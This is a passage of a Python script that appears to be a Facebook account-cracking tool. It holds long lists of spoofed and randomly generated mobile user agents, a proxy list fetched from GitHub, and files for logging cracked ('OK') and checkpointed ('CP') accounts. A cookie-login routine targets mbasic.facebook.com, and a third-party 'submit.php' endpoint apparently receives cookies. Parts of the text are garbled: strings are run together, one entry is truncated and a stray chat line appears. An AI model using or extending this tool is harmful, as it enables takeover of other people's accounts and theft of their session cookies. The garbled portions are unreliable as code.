    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; ko-kr) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3',
    'Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Mobile/8A306',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_10 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8E600 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7E18 Safari/528.16',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Mobile/8A306',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; nb-no) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS_3_2_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B500 Safari/531.21.10',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; CPU OS 4_3 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/8F190 Safari/7534.48.3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_4 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_10 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8E600 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2 Twitter for iPhone',
    'Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148 Twitter for iPad',
    'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J3',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5',
    'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; es-es) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2',
    'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5',
    'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/528.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 1…',
    '[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36']
ugen2 = [
    'Mozilla/5.0 (Linux; U; Android 7.0; es-us; 7.0; Redmi Note 4 Build/NRD90M)L659B) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4773.134 Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2Mozilla/5.0 (Linux; U; Android 7.0; es-us; 12; Redmi Note 4 Build/NRD90M)G813D) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4860.149 Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2']
ugen = [
    'Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/528.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64T449V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4571.73 Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15',
    'Mozilla/5.0 (Linux; U; Android 17;  en-us; GT-K580T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4806.44 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 11;  en-us; GT-L592D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4228.58 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 9;  en-us; GT-Y602C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4870.41 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 6;  en-us; GT-O209S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4789.51 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 12;  en-us; GT-E525L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4572.143 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 12;  en-us; GT-Q191U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4775.146 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-A750FN) 8;  en-us; GT-U702Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4514.138 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android  7.0; Mi 4i Build//L87A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4926.314 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android  5.0; xiaomi 6 Build/I105N) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.3401.235 Mobile Safari/537.36']
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox = requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
	open('.prox.txt', 'w').write(prox)
except Exception as e:
	print(' ')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='11; Redmi Note 5A Lite)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Chrome/96.0.4664.45 Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['M2101K6G'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX3396'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 13;'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c=random.choice(['RMX3396'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['9','10','11','12'])
	c=random.choice(['V2147'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
	ugen.append(uaku2)
		
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['2201116PG'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX3115 Build/SP1A.210812.016; wv'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SHARK KTUS-H0'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
		
	
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/20A357 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_Qaau_GB;FBOP/5]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X688B'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
		
					
	aa='Mozilla/5.0 (Linux; Android 10;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Mi 9T Pro Build/QKQ1.190825.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ @nader20090 ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ HHNI ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ @nader20090 ]---------------#


import os
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n")
    os.system("pip install requests")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
    os.system("pip install rich")

import requests, sys, time, re, random
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from time import time as mek

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

class Login:

    def __init__(self):
        self.ses=requests.Session()
        self.url = "https://mbasic.facebook.com"
        self.id, self.ok, self.cp, self.lo = [], [], [], 0
        self.cok = "https://api-cdn-fb.yayanxd.my.id/submit.php"
        self.kontol, self.iya, self.pasw = {}, [], []
        self.menu()

    def hapus(self):
        try:os.remove("ok.coki.txt");os.remove(".ID.txt")
        except:pass

    def logoo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        

    def login_cokie(self):
        self.logoo()
        print('')
        print('')
        try:
            cok = input("[<>] cookie >> ")
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
            if 'href="/zero/optin/write/' in str(link):
                print("[<>] notice: anda sedang menggunakan mode free facebook")
                print("[<>] Mohon tunggu sebentar, system sedang mengubah cookie ke mode data.")
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": cok}).text
                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
                self.ses.post(f"{self.url}{poss}", data=date, cookies={"cookie": cok}).text
